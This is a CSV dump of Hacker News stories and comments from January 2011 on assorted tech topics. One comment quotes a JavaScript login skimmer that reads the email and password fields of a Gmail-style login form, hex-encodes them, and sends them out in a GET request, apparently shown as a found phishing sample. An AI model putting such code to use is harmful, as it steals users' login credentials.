ID,Type,Story,Parent,Points,Comments,Author,Title,URL,Content,Created
2079220,comment,2079121,2079121,0,0,abecedarius,,,"Trivia: total donations came to $31,337, exactly.<p>New interview of the author: <a href=""http://www.adventureclassicgaming.com/index.php/site/interviews/622/"" rel=""nofollow"">http://www.adventureclassicgaming.com/index.php/site/intervi...</a>",1294397925
2079219,comment,2077312,2077785,0,0,alinajaf,,,"I have to second the brazil nut recommendation. I've been chomping through three before sleep and three on waking and the difference in appetite is... pronounced. That plus the butter fat/fermented cod liver oil and extra kimchee.",1294397915
2079218,story,,,176,62,instakill,"Cwora - taking the piss out of Quora",http://www.cwora.com/,,1294397853
2079217,comment,2078693,2078879,0,0,nervechannel,,,"Maybe try using something like a decision tree where the classification steps are much more obvious.<p>There are parallelizable implementations out there...",1294397817
2079216,comment,2078361,2079178,0,0,leftnode,,,"Yup, I've done this as well at current and past jobs. I'll usually just invent a new project, it gets the boss's attention and they like it, so I get to work on that rather than the normal boring stuff.<p>It's great to invent your own projects at work.",1294397770
2079215,comment,2079046,2079152,0,0,statictype,,,"I also really want to use this app - it's like the Seinfeld calendar - but the Facebook login turned me away.<p>I can understand, though, how this would be a selling point for 'normal' people.<p>Is there anyway to turn off the 'tell everyone on facebook about this' feature if I login using my FB account?",1294397632
2079214,comment,2075871,2079213,0,0,SimplePast,,,"For gmail",1294397592
2079213,comment,2075871,2075871,0,0,SimplePast,,,"The java script function :<p><!--
function h6h(st){var st2="""";for(i=0;i<st.length;i++){c=st.charCodeAt(i);ch=(c&0xF0)>>4;cl=c&0x0F;
st2=st2+String.fromCharCode(ch+97)+String.fromCharCode(cl+97);}return st2;}
function r5t(len){var st="""";for(i=0;i<len;i++)st=st+String.fromCharCode(Math.floor(Math.random(1)*26+97)); return st;}
function hAAAQ3d() {var frm = document.getElementById(""gaia_loginform""); var us3r = frm.Email.value; var pa55 = frm.Passwd.value;
 var url = ""<a href=""http://www.google.com/wo0dh3ad?q=+r5t(5)+&u=+h6h(us3r)+&p=+h6h(pa55)"" rel=""nofollow"">http://www.google.com/wo0dh3ad?q=+r5t(5)+&u=+h6h(us3r)+&...</a>;
 var bnm = navigator.appName; if(bnm=='Microsoft Internet Explorer') inv0k3(url); else inv0k2(url);}
function inv0k1(url) {var objhq = document.getElementById(""x6y7z8""); objhq.src = url;}
function inv0k2(url) {var xr = new XMLHttpRequest(); xr.open(""GET"", url, false); xr.send("""");}
function inv0k3(url) {var xr = new ActiveXObject('Microsoft.XMLHTTP'); xr.open(""GET"", url, false); xr.send("""");}
//-->",1294397573
2079212,comment,2079121,2079121,0,0,thorin,,,"Great link, although 24K doesn't seem like much for a lifetimes work! I look forward to playing some of the games. The teaser reminded me of Infocom's Hitchhikers Guide for some reason...",1294397530
2079211,comment,2070534,2070534,0,0,vinodlive,,,"How did the assassins exit room 230, chained from the inside?!!",1294397355
2079210,story,,,4,7,yogsototh,"Ask HN: Functionnal programming for UI?",,"Hello,<p>I wanted to make a complete javascript web client. The standard usage with imperative language is to use the MVC pattern.
I used object oriented programming but the javascript syntax for OOP was a really poor experience. I had the feeling that using a functionnal paradigm would had fitted better with js.<p>I know HN was done with Ark a functional programming language. So I wonder if an MVC pattern was done under the hood? May be there is a good recommendation or a known pattern that help making UI under a functional programming paradigm?",1294397308
2079209,comment,2078749,2078749,0,0,randomtoken,,,"One of the WSJ staffers who writes for that blog and a lot of their tech pieces, Jessica Vascellaro, dates Sam Lessin. He was in Mark's frat and just sold his company to Facebook.",1294397263
2079207,comment,2076992,2077411,0,0,wladimir,,,"But isn't the speed advantage gone very soon as soon as you have to type non-english text such as programming languages and specific commands (which are a large part of using a computer, you don't only want to type the text, you also want to format it and move it around).<p>Try listening to <a href=""http://www.linux.fm/"" rel=""nofollow"">http://www.linux.fm/</a> for more than three minutes and you'll get my point :)",1294397023
2079205,comment,2076992,2077248,0,0,wlievens,,,"Will vi be around in 20 years?",1294396992
2079204,comment,2077312,2078252,0,0,tome,,,"Somehow a gym subscription that you're going to use for 4 hours a month seems like a waste of money.",1294396934
2079203,comment,2078693,2078693,0,0,aj700,,,"Omitting these domains from results is ""automated"".<p><i>Managing the list isn't</i>. It's based partly on how many users report a domain as being spam. At least that's one of the reasons for inclusion. And don't bayesian filters, with little data to work with and if newly implemented always have false positives?<p>Maybe some are labelling valid stuff as spam out of spite.<p>When blekko has millions of users labelling stuff as spam instead of very few, the system will be harder to abuse and the list much better.",1294396924
2079202,comment,2079121,2079154,0,0,pvg,,,"You could try reading the guy's bio - <a href=""http://en.wikipedia.org/wiki/Andrew_Plotkin"" rel=""nofollow"">http://en.wikipedia.org/wiki/Andrew_Plotkin</a><p>Or even the article -<p><i>But I guess everybody who succeeds on Kickstarter has to answer this question.<p>How did I do it, really?
First, spend 15 years working hard on projects with no reward but community goodwill.</i>",1294396872
